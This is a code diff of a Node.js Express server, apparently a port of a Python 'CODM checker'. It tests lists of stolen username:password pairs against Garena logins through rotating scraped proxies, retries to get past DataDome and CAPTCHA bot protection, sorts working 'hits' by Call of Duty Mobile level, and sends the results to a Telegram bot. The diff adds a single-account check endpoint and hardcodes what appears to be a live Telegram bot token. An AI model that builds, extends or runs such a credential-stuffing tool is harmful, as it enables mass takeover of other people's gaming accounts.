@@ -1,5 +1,5 @@
+
 // server.js
-const express = require('express');
 const os = require('os');
 const sys = { // Partial sys emulation
     exit: (code) => {
@@ -480,7 +480,7 @@ function get_encrypted_password(password, v1, v2) {
 }
 
 function get_request_data(initial_cookies_tuple) {
-    const [cookies] = initial_cookies_tuple; // Destructure the first element
+    let [cookies] = initial_cookies_tuple; // Destructure the first element
     if (typeof cookies !== 'object' || cookies === null) {
         logging.warning("get_request_data received non-object cookies. Using empty object as fallback.");
         cookies = {};
@@ -691,7 +691,7 @@ async function get_datadome_cookie(proxies = null, timeout = REQUEST_TIMEOUT) {
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
     };
     const payload = {
-        'jsData': json.dumps({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}),
+        'jsData': json.stringify({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}), // Corrected json.dumps to json.stringify
         'eventCounters': '[]', 'jsType': 'ch', 'ddv': '4.35.4',
         'Referer': 'https://account.garena.com/', 'request': '%2F', 'responsePage': 'origin',
     };
@@ -705,14 +705,14 @@ async function get_datadome_cookie(proxies = null, timeout = REQUEST_TIMEOUT) {
     
     try {
         const response = await axios.post(url, data, axiosConfig);
-        const response_text = strip_ansi_codes(response.data); // Assuming response.data is string, might be object if axios auto-parses JSON
+        const response_text = strip_ansi_codes(String(response.data)); // Ensure string for strip_ansi_codes
 
         if (detect_captcha_in_response(typeof response.data === 'string' ? response.data : json.stringify(response.data))) {
             logging.warning(`CAPTCHA DETECTED IN DATADOME RESPONSE BODY: ${String(response.data).substring(0,200)}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME RESPONSE BODY)";
         }
 
-        if (response.status < 200 || response.status >= 300) { // Axios throws for >=300 by default, but explicit check is fine
+        if (response.status < 200 || response.status >= 300) { 
              throw new Error(`HTTP error ${response.status}`);
         }
         
@@ -743,11 +743,11 @@ async function get_datadome_cookie(proxies = null, timeout = REQUEST_TIMEOUT) {
              return "[🤖] CAPTCHA DETECTED (DATADOME REQUEST/PARSE ERROR)";
         }
         
-        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { // Axios timeout
+        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { 
             logging.error(`TIMEOUT GETTING DATADOME COOKIE: ${error_str}`);
             return "[⏱️] DATADOME TIMEOUT";
         }
-        if (e.isAxiosError && !e.response) { // Connection error (e.g. ECONNREFUSED)
+        if (e.isAxiosError && !e.response) { 
             logging.error(`CONNECTION ERROR GETTING DATADOME COOKIE: ${error_str}`);
             return "[🔴] DATADOME CONNECTION ERROR";
         }
@@ -991,7 +991,7 @@ async function check_login(account_username, _id, encryptedpassword, password, s
         }
 
         if (e.code === 'ECONNABORTED') { // Axios timeout
-            if (e.message.toLowerCase().includes('connect ETIMEDOUT')) {
+            if (e.message.toLowerCase().includes('connect etimedout')) { // connect ETIMEDOUT
                 logging.error(`LOGIN CONNECTION TIMED OUT FOR ${account_username} (PROXY/NETWORK ISSUE).`);
                 return "[⏱️] LOGIN CONNECT TIMEOUT";
             }
@@ -1034,7 +1034,7 @@ async function check_login(account_username, _id, encryptedpassword, password, s
             return "[🤖] CAPTCHA REQUIRED (LOGIN ERROR FIELD)";
         }
         
-        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; // Python used "in"
+        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; 
         if (error_msg.includes("error_account_does_not_exist")) return "[👻] ACCOUNT DOESN'T EXIST";
         if (error_msg.includes("error_account_not_activated")) return "[⏳] ACCOUNT NOT ACTIVATED";
         return `[🚫] LOGIN ERROR: ${error_msg}`;
@@ -1518,19 +1518,19 @@ async function check_account(username, password, date, initial_cookies_tuple, pr
         if (response_prelogin && response_prelogin.headers['set-cookie']) {
             const newCookiesFromPreloginAgain = parseSetCookies(response_prelogin.headers['set-cookie']);
             for (const cookieName in newCookiesFromPreloginAgain) {
-                if (cookieName !== 'datadome') { // Python code logic
+                if (cookieName !== 'datadome') { 
                     login_step_cookies[cookieName] = newCookiesFromPreloginAgain[cookieName];
                 }
             }
         }
         
         const login_result = await check_login(
-            username, _id,
+            username, random_id, // Pass random_id as _id
             encrypted_password_val,
             password,
-            headers, // selected_header in python
+            headers, 
             login_step_cookies,
-            datadome_for_login_step, // dataa in python
+            datadome_for_login_step, 
             date, proxies, timeout
         );
         return login_result;
@@ -1684,6 +1684,7 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
 
     let available_datadomes_for_retry_session = [];
     let current_proxy_selection_index = -1;
+    let start_time; // Declare here to ensure it's in scope for finally
 
     try {
         for (const [key, fpath_val] of Object.entries(main_file_paths)) {
@@ -1692,12 +1693,10 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
             else if (key === 'failed_codm') specific_header_line = "# CODM CHECK FAILED ACCOUNTS (GARENA LOGIN OK) | FORMAT: USER:PASS | REASON\n";
             else if (key === 'successful_unsorted') specific_header_line = "# ALL SUCCESSFUL ACCOUNTS (UNSORTED)\n";
 
-            // Use fs.openSync and fs.writeSync for direct handle emulation, or just append.
-            // For simplicity with 'w' mode, just ensure file is created/truncated.
             fs.writeFileSync(fpath_val, OUTPUT_FILE_HEADER.toUpperCase(), 'utf-8');
             if (specific_header_line) fs.appendFileSync(fpath_val, specific_header_line.toUpperCase(), 'utf-8');
             fs.appendFileSync(fpath_val, "\n", 'utf-8');
-            main_output_files_handles[key] = fpath_val; // Store path to append later
+            main_output_files_handles[key] = fpath_val; 
         }
         
         const valid_accounts = [];
@@ -1707,17 +1706,12 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
         lines.forEach((line_content_raw, line_num) => {
             const line_content = line_content_raw.trim();
             if (!line_content || line_content.startsWith('#')) {
-                return; // continue
+                return; 
             }
             
             const extracted_credentials = remove_url(line_content);
             const line_to_parse = extracted_credentials ? extracted_credentials : line_content;
             
-            const parts = line_to_parse.split(':'); // Not limiting to 1 split as in Python's split(':', 1)
-                                                    // but rather split by all colons and take first two parts.
-                                                    // Python's split(':', 1) gives ['user', 'pass:with:colon']
-                                                    // JS split(':') gives ['user', 'pass', 'with', 'colon']
-                                                    // To match Python:
             let identifier, pword;
             const firstColonIndex = line_to_parse.indexOf(':');
 
@@ -1737,7 +1731,7 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
         if (total_accounts === 0) {
             console.log(`${COLORS['YELLOW']}⚠️ NO VALID ACCOUNTS FOUND IN ${path.basename(filePath)}.${COLORS['RESET']}`);
             logging.warning(`No valid accounts found in ${path.basename(filePath)}.`);
-            return { // Return summary for API
+            return { 
                 message: `No valid accounts found in ${path.basename(filePath)}.`,
                 totalAccounts: 0,
                 processed: 0,
@@ -1755,7 +1749,7 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
         else console.log(`${COLORS['CYAN']}   USING PROXY: NO${COLORS['RESET']}`);
         await time.sleep(1);
 
-        const start_time = time.time();
+        start_time = time.time();
         let progress_line = "";
         let account_index = 0;
         
@@ -1765,24 +1759,22 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
             let current_account_proxy_attempt_count = 0;
             let final_result_for_account = null;
 
-            mainLoopRetry: // Label for continue
+            mainLoopRetry: 
             while (true) {
-                let current_proxy_obj_for_axios = null; // For axios
+                let current_proxy_obj_for_axios = null; 
                 let proxy_display_name = "NONE";
                 let actual_proxy_url_for_check = null;
                 let chosen_proxy_idx_for_removal = -1;
 
                 if (proxy_list && proxy_list.length > 0) {
-                    if (current_account_proxy_attempt_count === 0) { // First attempt for this account
+                    if (current_account_proxy_attempt_count === 0) { 
                         current_proxy_selection_index = (current_proxy_selection_index + 1) % proxy_list.length;
                         chosen_proxy_idx_for_removal = current_proxy_selection_index;
-                    } else { // Retry for this account, pick a random proxy
+                    } else { 
                         chosen_proxy_idx_for_removal = random.randint(0, proxy_list.length - 1);
                     }
                     
                     actual_proxy_url_for_check = proxy_list[chosen_proxy_idx_for_removal];
-                    // Convert to axios proxy object: { http: '...', https: '...' }
-                    // The buildAxiosProxyConfig expects an object {http: url} or {https: url}
                     current_proxy_obj_for_axios = { http: actual_proxy_url_for_check, https: actual_proxy_url_for_check };
 
                     let temp_proxy_display = actual_proxy_url_for_check.includes('@') ? actual_proxy_url_for_check.split('@')[1] : actual_proxy_url_for_check;
@@ -1817,18 +1809,18 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
                 while (datadome_retry_attempt_count <= MAX_DATADOME_RETRIES_FOR_ACCOUNT) {
                     final_result_for_account = await check_account(username, password_from_file, date_timestamp,
                                                       initial_cookies_tuple_for_session, 
-                                                      current_proxy_obj_for_axios, // Pass axios proxy obj
+                                                      current_proxy_obj_for_axios, 
                                                       current_dd_for_prelogin_retry,
-                                                      REQUEST_TIMEOUT); // timeout in seconds
+                                                      REQUEST_TIMEOUT); 
 
                     const is_captcha_from_check = typeof final_result_for_account === 'string' && final_result_for_account.startsWith("[🤖] CAPTCHA");
                     if (!is_captcha_from_check) {
-                        break; // Exit datadome retry loop
+                        break; 
                     }
 
                     datadome_retry_attempt_count += 1;
                     if (datadome_retry_attempt_count <= MAX_DATADOME_RETRIES_FOR_ACCOUNT) {
-                        process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r"); // Clear line
+                        process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r"); 
                         console.log(`${COLORS['YELLOW']}   ACCOUNT ${htmlEscape(username)}: RETRYING ACCOUNT ${datadome_retry_attempt_count}/${MAX_DATADOME_RETRIES_FOR_ACCOUNT} ON PROXY/IP ${proxy_display_name.toUpperCase()})${COLORS['RESET']}`);
 
                         if (available_datadomes_for_retry_session.length === 0) {
@@ -1844,21 +1836,21 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
                             } else {
                                 logging.warning(`Failed to get a new datadome for retry (${username}). Error: ${new_dd}`);
                                 if (typeof new_dd === 'string' && RETRYABLE_PROXY_ERROR_PREFIXES.some(p => new_dd.startsWith(p))) {
-                                    final_result_for_account = new_dd; // Propagate this error
+                                    final_result_for_account = new_dd; 
                                 }
-                                break; // Exit datadome retry loop, could not get new DD
+                                break; 
                             }
                         }
                         await time.sleep(1.5);
-                        process.stdout.write(progress_line); // Reprint progress
+                        process.stdout.write(progress_line); 
                     } else {
                         logging.warning(`ACCOUNT ${username} STILL CAPTCHA AFTER ${MAX_DATADOME_RETRIES_FOR_ACCOUNT} DATADOME RETRIES (ON PROXY/IP: ${proxy_display_name}).`);
-                        break; // Exit datadome retry loop, max retries reached
+                        break; 
                     }
-                } // End datadome retry loop
+                } 
                 
-                available_datadomes_for_retry_session = []; // Clear for next account or proxy retry
-                process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r"); // Clear line
+                available_datadomes_for_retry_session = []; 
+                process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r"); 
 
                 let is_retryable_error_type = false;
                 if (typeof final_result_for_account === 'string') {
@@ -1887,23 +1879,22 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
                         
                         if (proxy_list.length === 0) {
                             console.log(`${COLORS['RED']}   All proxies have been exhausted/removed!${COLORS['RESET']}`);
-                            proxy_list = null; // Treat as no proxy from now on
+                            proxy_list = null; 
                         }
                         
                         current_account_proxy_attempt_count += 1;
                         if (current_account_proxy_attempt_count < PROXY_RETRY_LIMIT && proxy_list && proxy_list.length > 0) {
                             console.log(`${COLORS['YELLOW']}   Retrying account ${htmlEscape(username)} with a new proxy (Account Attempt ${current_account_proxy_attempt_count + 1}/${PROXY_RETRY_LIMIT})...${COLORS['RESET']}`);
                             await time.sleep(1.5);
-                            continue mainLoopRetry; // Use JS label to continue outer while loop
+                            continue mainLoopRetry; 
                         } else {
                             if (!(proxy_list && proxy_list.length > 0) && current_account_proxy_attempt_count < PROXY_RETRY_LIMIT) {
                                 final_result_for_account = `[PROXY EXHAUSTED] Last error for ${username}: ${final_result_for_account}`;
-                            } else { // Max attempts or no proxies left from start
+                            } else { 
                                 final_result_for_account = `[MAX PROXY ATTEMPTS FOR ACCOUNT] Last error for ${username}: ${final_result_for_account}`;
                             }
-                            // Fall through to process this final_result_for_account
                         }
-                    } else { // No proxies in use or error occurred without proxy
+                    } else { 
                         console.log(`\n${COLORS['RED_BG']}${COLORS['WHITE']} ✋ CAPTCHA/ERROR! ${COLORS['RESET']}`);
                         console.log(`${COLORS['RED']}   ACCOUNT: ${htmlEscape(username)}:${password_from_file}`);
                         console.log(`${COLORS['RED']}   REASON: ${htmlEscape(final_result_for_account)}`);
@@ -1911,15 +1902,9 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
                         const action_needed = "CHANGE YOUR IP (E.G., RESTART VPN/ROUTER)";
                         console.log(`${COLORS['YELLOW']}   🔒 ISSUE DETECTED. PLEASE ${action_needed.toUpperCase()}.${COLORS['RESET']}`);
                         logging.warning(`CAPTCHA/ERROR for ${username} without proxy. Original script would pause. API will fail this account.`);
-                        // For an API, we can't pause for user input. We'll fail this account.
-                        // If this becomes a persistent issue, the whole bulk check might need to stop.
-                        // For now, fail current account and continue, or if CAPTCHA, it's already in final_result_for_account.
-                        // This branch implies the `final_result_for_account` is already a retryable error.
-                        // It will be processed as a general failure below.
                     }
                 }
                 
-                // Process final_result_for_account
                 if (typeof final_result_for_account === 'object' && final_result_for_account !== null && !Array.isArray(final_result_for_account)) {
                     const codm_level_int = (final_result_for_account.codm_details || {}).level;
                     const level_range_base = get_level_range_filename_part(codm_level_int);
@@ -1964,7 +1949,7 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
                         cli_lines.push(`${COLORS['WHITE']}   LAST LOGIN: ${COLORS['CYAN']}${last_login_info} (${last_login_loc})${COLORS['RESET']}`);
                     }
                     cli_lines.push(`${COLORS['WHITE']}   CHECKED BY: ${COLORS['CYAN']}${checker_by_credit}${COLORS['RESET']}`);
-                    console.log("\n" + cli_lines.join("\n")); // Newline before to separate from progress
+                    console.log("\n" + cli_lines.join("\n")); 
 
                     const L1NK = (final_result_for_account.bindings || {}).facebook_link;
                     const file_lines_content_parts = [
@@ -2012,7 +1997,7 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
                     write_dynamic_result_to_file(path_account_level_file, full_content_for_file, headers_written_to_sorted_files);
 
                     const hits_dir = path.join(current_run_dir, "hits");
-                    const hits_filename = "@yishux_codm-hits.txt"; // Corrected filename from python logic
+                    const hits_filename = "@yishux_codm-hits.txt"; 
                     const path_hits_file = path.join(hits_dir, hits_filename);
                     
                     const data_for_hit_line = final_result_for_account;
@@ -2082,27 +2067,26 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
 
                 checked_count += 1;
                 account_index += 1;
-                break; // Exit mainLoopRetry (while true)
-            } // End mainLoopRetry
+                break; 
+            } 
             
             if (account_index < total_accounts && check_delay > 0) {
                 await time.sleep(check_delay);
             }
-        } // End account iteration loop
+        } 
         
         const clean_progress_line_len = strip_ansi_codes(progress_line).length || 50;
         process.stdout.write("\r" + " ".repeat(clean_progress_line_len + 5) + "\r");
 
 
     } catch (e) {
-        if (e.message.includes("ENOENT") || e.message.includes("INVALID FILE PATH")) { // File not found like error
+        if (e.message.includes("ENOENT") || e.message.includes("INVALID FILE PATH")) { 
              console.log(`\n${COLORS['RED']}❌ ERROR: INPUT FILE NOT FOUND or similar issue: ${filePath}${COLORS['RESET']}`);
              logging.error(`ERROR: INPUT FILE NOT FOUND or similar issue: ${filePath} - ${e.message}`);
         } else {
              console.log(`\n${COLORS['RED']}💥 AN UNEXPECTED ERROR OCCURRED DURING BULK CHECK: ${strip_ansi_codes(e.message)}${COLORS['RESET']}`);
              logging.exception("UNEXPECTED ERROR DURING bulk_check LOOP", e);
         }
-        // For API, rethrow or return error structure
         throw e; 
     } finally {
         let closed_count = 0;
@@ -2110,10 +2094,9 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
         
         for (const [key, f_path_val] of Object.entries(main_output_files_handles)) {
             try {
-                // Files are written progressively, just append footer.
                 if (fs.existsSync(f_path_val)) {
                     fs.appendFileSync(f_path_val, OUTPUT_FILE_FOOTER.toUpperCase(), 'utf-8');
-                    closed_count +=1; // Metaphorical close for appendFileSync approach
+                    closed_count +=1; 
                     if (fs.statSync(f_path_val).size > min_file_size_for_send_val) {
                         generated_files_for_telegram.push(f_path_val);
                     }
@@ -2152,20 +2135,20 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
         }
         
         if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && 
-            TELEGRAM_BOT_TOKEN !== "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" && // Check against placeholder example if needed
-            TELEGRAM_CHAT_ID !== "6542321044") { // Or generic "YOUR_..." placeholders
+            TELEGRAM_BOT_TOKEN !== "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" &&
+            TELEGRAM_CHAT_ID !== "6542321044") {
              if (generated_files_for_telegram.length > 0) {
                   const telegram_caption_base = `S1N CODM CHECK FINISHED: ${run_folder_name_sanitized.toUpperCase()}`;
                   await send_files_to_telegram(generated_files_for_telegram, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, telegram_caption_base);
              } else {
                   logging.info("NO NON-EMPTY RESULT FILES GENERATED TO SEND TO TELEGRAM.");
              }
-        } else if (total_accounts > 0) { // Ensure it's not an empty run
+        } else if (total_accounts > 0) { 
             console.log(`${COLORS['YELLOW']}CRAFTED BY S1N | TELEGRAM: @YISHUX${COLORS['RESET']}`);
         }
         
         const end_time = time.time();
-        const total_duration = end_time - (start_time || end_time); // start_time might not be set if error early
+        const total_duration = end_time - (start_time || end_time); 
         const total_successful_hits_final = Object.values(level_summary_counts).reduce((s, c) => s + c, 0) - (level_summary_counts["UNKNOWN_LEVEL"] || 0);
 
         console.log(`\n${COLORS['CYAN']}${'='.repeat(15)} CHECK SUMMARY ${'='.repeat(15)}${COLORS['RESET']}`);
@@ -2199,7 +2182,7 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
 
         const delay_msg = check_delay > 0 ? `${check_delay}S` : "NONE";
         let proxy_source_for_summary = "NO";
-        if (initial_proxy_count > 0) { // initial_proxy_count was from original Python, need to pass if used
+        if (initial_proxy_count > 0) { 
             proxy_source_for_summary = `FILE/AUTOSCRAPE (${initial_proxy_count} INITIAL, ${(proxy_list ? proxy_list.length : 0)} REMAINING)`;
         }
         
@@ -2248,7 +2231,6 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
         console.log(`${COLORS['CYAN']}${'='.repeat(40)}${COLORS['RESET']}`);
         console.log(`\n${COLORS['BLUE_BOLD']}FINISHED PROCESSING.${COLORS['RESET']}`);
 
-        // For API, return a summary object
         return {
             message: "Bulk check finished.",
             durationSeconds: parseFloat(total_duration.toFixed(2)),
@@ -2263,19 +2245,13 @@ async function bulk_check(filePath, initial_cookies_tuple_for_session, check_del
             outputDirectory: current_run_dir,
             generatedFiles: generated_files_for_telegram 
         };
-    } // End finally
+    } 
 }
 
 
 // CLI interaction functions (translated but not primary for API)
-// These would be used by a CLI wrapper around the bulk_check or similar core logic.
-// For the API, parameters are passed in the request.
-
 function select_file_by_choice(prompt_message = "SELECT FILE", file_extension = ".txt", start_dir = ".") {
-    // This is a CLI interaction function. In an API, file path would be a parameter.
     logging.warning("select_file_by_choice is a CLI function and not directly usable in API request flow.");
-    // For API, you'd get file path from request or have a fixed path.
-    // Returning a dummy path for structural completeness if this were ever called in a test.
     const files = fs.readdirSync(start_dir).filter(f => f.endsWith(file_extension) && fs.statSync(path.join(start_dir,f)).isFile());
     if (files.length > 0) return path.join(start_dir, files[0]);
     return null;
@@ -2283,12 +2259,12 @@ function select_file_by_choice(prompt_message = "SELECT FILE", file_extension = 
 
 function select_delay_by_choice() {
     logging.warning("select_delay_by_choice is a CLI function.");
-    return 3; // Default to 3s as in Python's recommendation
+    return 3; 
 }
 
 function select_proxy_option_by_choice() {
     logging.warning("select_proxy_option_by_choice is a CLI function.");
-    return "NO_PROXY"; // Default
+    return "NO_PROXY"; 
 }
 
 function load_proxies_from_file(filepath) {
@@ -2304,10 +2280,10 @@ function load_proxies_from_file(filepath) {
             let proxy_url = line.trim();
             if (proxy_url && !proxy_url.startsWith('#')) {
                 if (!/^(http|https|socks4|socks5):\/\//.test(proxy_url)) {
-                    proxy_url = `http://${proxy_url}`; // Default to http if no scheme
+                    proxy_url = `http://${proxy_url}`; 
                 }
                 try {
-                    const parsed = new URL(proxy_url); // Validates URL structure
+                    const parsed = new URL(proxy_url); 
                     if (['http:', 'https:', 'socks4:', 'socks5:'].includes(parsed.protocol) && parsed.hostname) {
                         proxies.push(proxy_url);
                     } else {
@@ -2350,12 +2326,10 @@ async function fetch_proxies_from_online_sources(timeout = PROXYSCRAPE_FETCH_TIM
             raw_proxies_from_source.forEach(line_content => {
                 let proxy_candidate = line_content.trim();
                 if (proxy_candidate && !proxy_candidate.startsWith('#')) {
-                    // Basic IP:Port format
                     if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/.test(proxy_candidate)) {
                         all_proxies.add(`http://${proxy_candidate}`);
                         count_from_source += 1;
                     } 
-                    // Already has scheme
                     else if (/^(http|https|socks4|socks5):\/\//.test(proxy_candidate)) {
                         try {
                             const parsed = new URL(proxy_candidate);
@@ -2365,7 +2339,6 @@ async function fetch_proxies_from_online_sources(timeout = PROXYSCRAPE_FETCH_TIM
                             }
                         } catch (e) { /* ignore parse error */ }
                     }
-                    // No scheme but has user:pass@host:port or host:port
                     else if (proxy_candidate.includes(':')) { 
                         all_proxies.add(`http://${proxy_candidate}`);
                         count_from_source +=1;
@@ -2397,6 +2370,7 @@ async function fetch_proxies_from_online_sources(timeout = PROXYSCRAPE_FETCH_TIM
 }
 
 // --- Express API Setup ---
+const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -2410,15 +2384,15 @@ app.use((err, req, res, next) => {
 
 
 app.post('/api/bulk-check', async (req, res) => {
-    clear_screen(); display_banner(); // Keep for structural similarity, though less useful for API
+    clear_screen(); display_banner(); 
     console.log(`${COLORS['GREEN']}API /api/bulk-check CALLED.${COLORS['RESET']}`);
 
     const {
-        accountFilePath, // Expect server-side path
-        checkDelay = 0,  // Default from Python
-        proxyOption = "NO_PROXY", // "NO_PROXY", "USER_FILE", "AUTOSCRAPE"
-        proxyFilePath = null, // Path to user's proxy file
-        runFolderName = null // Optional custom name for results folder
+        accountFilePath, 
+        checkDelay = 0,  
+        proxyOption = "NO_PROXY", 
+        proxyFilePath = null, 
+        runFolderName = null 
     } = req.body;
 
     if (!accountFilePath) {
@@ -2436,7 +2410,8 @@ app.post('/api/bulk-check', async (req, res) => {
 
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID ||
-       TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID") { // Replace with actual placeholder check
+       TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID" ||
+       TELEGRAM_BOT_TOKEN === "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" || TELEGRAM_CHAT_ID === "6542321044") {
         console.log(`${COLORS['YELLOW']}⚠️ WARNING: TELEGRAM BOT TOKEN/CHAT ID NOT SET OR USING PLACEHOLDERS. FILES WILL NOT BE SENT.${COLORS['RESET']}`);
     } else {
         console.log(`${COLORS['GREEN']}CRAFTED BY S1N | TELEGRAM: @YISHUX${COLORS['RESET']}`);
@@ -2484,15 +2459,15 @@ app.post('/api/bulk-check', async (req, res) => {
     }
     
     console.log(`\n${COLORS['GREEN']}PREPARING TO CHECK ACCOUNTS...${COLORS['RESET']}`);
-    await time.sleep(2.0); // Keep delay for visual feedback if any
+    await time.sleep(2.0); 
     clear_screen(); display_banner();
 
     try {
         const summary = await bulk_check(
             accountFilePath,
             session_initial_cookies_tuple,
-            Number(checkDelay), // Ensure it's a number
-            proxy_list_loaded, // Already a mutable copy or null
+            Number(checkDelay), 
+            proxy_list_loaded, 
             runFolderName
         );
         res.status(200).json({ status: "completed", summary: summary });
@@ -2502,15 +2477,87 @@ app.post('/api/bulk-check', async (req, res) => {
     }
 });
 
+
+app.post('/api', async (req, res) => {
+    // clear_screen(); display_banner(); // Optional for pure API endpoint, kept for style consistency if desired
+    console.log(`${COLORS['GREEN']}API /api/check-account CALLED.${COLORS['RESET']}`);
+    logging.info('API /api/check-account called.');
+
+    const { user, password } = req.body;
+
+    if (!user || !password) {
+        logging.warning('/api/check-account: Missing user or password in request body.');
+        return res.status(400).json({ error: "User and password are required." });
+    }
+
+    logging.info(`/api/check-account: Checking account for user: ${user.substring(0,3)}...`); // Log sanitized user
+
+    try {
+        const date_timestamp = get_current_timestamp();
+        const session_initial_cookies_tuple = starting_cookies();
+        
+        const result = await check_account(
+            user,
+            password,
+            date_timestamp,
+            session_initial_cookies_tuple,
+            null, // proxies: For single check, typically direct connection
+            null, // datadome_for_prelogin_attempt: Let check_account handle it
+            REQUEST_TIMEOUT
+        );
+
+        if (typeof result === 'object' && result !== null && !Array.isArray(result)) {
+            logging.info(`/api/check-account: Success for user ${user.substring(0,3)}.... Level: ${(result.codm_details || {}).level}`);
+            return res.status(200).json({ status: "success", data: result });
+        } else if (Array.isArray(result) && result[0] === "CODM_FAILURE") {
+            const [, fail_user, , fail_reason] = result;
+            const clean_reason = strip_ansi_codes(fail_reason);
+            logging.warning(`/api/check-account: CODM_FAILURE for user ${fail_user.substring(0,3)}.... Reason: ${clean_reason}`);
+            return res.status(200).json({ 
+                status: "partial_success",
+                message: "Garena login successful, but CODM check failed.",
+                details: clean_reason,
+                error_type: "CODM_FAILURE",
+                username: fail_user
+            });
+        } else if (typeof result === 'string') {
+            const error_message = strip_ansi_codes(result);
+            logging.warning(`/api/check-account: Failed for user ${user.substring(0,3)}.... Reason: ${error_message}`);
+
+            if (error_message.startsWith("[🤖] CAPTCHA")) {
+                return res.status(429).json({ status: "error", message: error_message, error_type: "CAPTCHA" });
+            } else if (error_message.includes("INCORRECT PASSWORD")) {
+                return res.status(401).json({ status: "error", message: error_message, error_type: "INCORRECT_PASSWORD" });
+            } else if (error_message.startsWith("[👻] ACCOUNT DOESN'T EXIST")) {
+                 return res.status(404).json({ status: "error", message: error_message, error_type: "ACCOUNT_NOT_FOUND" });
+            } else if (error_message.includes("FORBIDDEN (403)")) {
+                return res.status(403).json({ status: "error", message: error_message, error_type: "FORBIDDEN" });
+            } else if (error_message.startsWith("[⏱️]") || error_message.includes("TIMEOUT")) {
+                return res.status(504).json({ status: "error", message: error_message, error_type: "TIMEOUT" });
+            } else if (error_message.startsWith("[🔴]") || error_message.startsWith("[🔌]") || error_message.includes("CONNECTION ERROR")) {
+                return res.status(502).json({ status: "error", message: error_message, error_type: "CONNECTION_ERROR" });
+            }
+            return res.status(400).json({ status: "error", message: error_message, error_type: "CHECK_FAILED" });
+        } else {
+            logging.error(`/api/check-account: Unexpected result type for user ${user.substring(0,3)}.... Result: ${JSON.stringify(result).substring(0,200)}`);
+            return res.status(500).json({ error: "Internal server error: Unexpected result type from checker." });
+        }
+
+    } catch (error) {
+        logging.error(`Error during /api/check-account for user ${user.substring(0,3)}...:`, error.message, error.stack);
+        res.status(500).json({ error: "Internal server error during account check", details: error.message });
+    }
+});
+
+
 // Mimic Python's __main__ block
 async function main_api_start() {
-    // Setup logging (moved basicConfig call here)
     const log_dir = "logs";
     fsExtra.ensureDirSync(log_dir);
     const log_file = path.join(log_dir, `checker_api_run_${get_current_timestamp()}.log`);
     
     logging.basicConfig({
-        level: logging.INFO, // Python default was INFO
+        level: logging.INFO, 
         handlers: [new logging.FileHandler(log_file, 'utf-8')],
     });
     
@@ -2519,21 +2566,19 @@ async function main_api_start() {
     logging.info(`LOG LEVEL: ${logging.getLevelName(logging.getLogger().level)}`);
     console.log(`${COLORS['GREY']}LOGGING DETAILED INFO TO: ${log_file}${COLORS['RESET']}`);
 
-
-    // Ensure S1N-CODM directory exists (Python code did this in main)
     fsExtra.ensureDirSync("S1N-CODM");
 
     app.listen(PORT, () => {
         clear_screen();
         display_banner();
         console.log(`${COLORS['GREEN']}S1N CODM CHECKER API IS LISTENING ON PORT ${PORT}${COLORS['RESET']}`);
-        console.log(`${COLORS['YELLOW']}Send POST requests to /api/bulk-check with parameters in JSON body.${COLORS['RESET']}`);
-        console.log(`${COLORS['CYAN']}Required body params: "accountFilePath" (string, server-side path).${COLORS['RESET']}`);
-        console.log(`${COLORS['CYAN']}Optional body params: "checkDelay" (number), "proxyOption" (string: "NO_PROXY", "USER_FILE", "AUTOSCRAPE"), "proxyFilePath" (string, if USER_FILE), "runFolderName" (string).${COLORS['RESET']}`);
+        console.log(`${COLORS['YELLOW']}Send POST requests to /api/bulk-check (for bulk) or /api/check-account (for single) with parameters in JSON body.${COLORS['RESET']}`);
+        console.log(`${COLORS['CYAN']}For /api/bulk-check: Required "accountFilePath" (string, server-side path). Optional: "checkDelay", "proxyOption", "proxyFilePath", "runFolderName".${COLORS['RESET']}`);
+        console.log(`${COLORS['CYAN']}For /api/check-account: Required "user" (string), "password" (string).${COLORS['RESET']}`);
     });
 }
 
-if (require.main === module) { // Equivalent to Python's if __name__ == "__main__":
